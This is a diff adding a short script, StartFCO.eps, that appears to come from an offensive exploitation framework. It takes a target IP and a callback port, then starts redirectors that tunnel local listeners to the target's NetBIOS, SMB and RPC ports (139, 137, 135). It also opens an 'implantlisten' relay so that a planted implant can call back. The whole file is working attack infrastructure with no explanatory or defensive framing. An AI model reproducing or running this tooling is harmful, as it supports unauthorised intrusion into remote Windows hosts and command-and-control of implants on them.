@@ -1,0 +1,74 @@
+#--------------------------------------------------------
+# File: StartFCO.eps
+#
+#  Start State:	Assumes nothing
+#  End State:	The redirectors necessary for a FCO
+#		operation are started.
+#  Errors:	
+#  Comments:	
+#
+# Arguments:
+#    $argv[1] = The target IP address
+#    $argv[2] = The FCO callback port
+#
+# Modifications:
+#  05/25/01	Created.
+#--------------------------------------------------------
+
+if ($argc != 3) {
+    echo "Usage: $argv[0] <targetIP> <callbackPort>\r\n";
+    return false;
+}
+
+@echo off;
+
+echo "Start FCO redirectors:";
+echo "        Target IP : $argv[1]";
+echo "    Callback Port : $argv[2]";
+ifnot (prompt "Do you want to continue?") {
+    echo "Aborting script...";
+    return false;
+}
+
+ifnot (`redirect ?`) {
+    echo "*** Redirect command not found...unable to complete script ***";
+    return false;
+}
+
+echo "Redirect TCP 139";
+if (`redirect -tcp -lplisten 1390 -target $argv[1] 139`) {
+    echo "    STARTED";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+echo "Redirect UDP 137";
+if (`redirect -udp -lplisten 1370 -target $argv[1] 137`) {
+    echo "    STARTED";
+} else {
+    echo "    FAILED";
+    `stop redirect -contains $argv[1]`;
+    return false;
+}
+
+echo "Redirect TCP 135";
+if (`redirect -tcp -lplisten 1350 -target $argv[1] 135`) {
+    echo "    STARTED";
+} else {
+    echo "    FAILED";
+    `stop redirect -contains $argv[1]`;
+    return false;
+}
+
+echo "Redirect TCP Callback Port $argv[2]";
+if (`redirect -tcp -implantlisten $argv[2] -target 127.0.0.1 $argv[2]`) {
+    echo "    STARTED";
+} else {
+    echo "    FAILED";
+    `stop redirect -contains $argv[1]`;
+    return false;
+}
+
+echo "All FCO redirectors have been started";
+return true;
